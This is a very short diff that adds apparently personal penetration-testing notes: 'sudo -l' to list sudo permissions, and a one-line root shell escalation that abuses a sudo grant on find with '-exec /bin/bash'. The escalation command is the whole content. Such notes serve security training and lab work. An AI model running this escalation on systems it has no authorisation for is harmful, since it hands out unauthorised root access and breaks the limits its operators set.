@@ -1,0 +1,8 @@
+
+List sudo:
+sudo -l
+
+Start shell with find:
+sudo /usr/bin/find /etc -exec /bin/bash \;
+
+
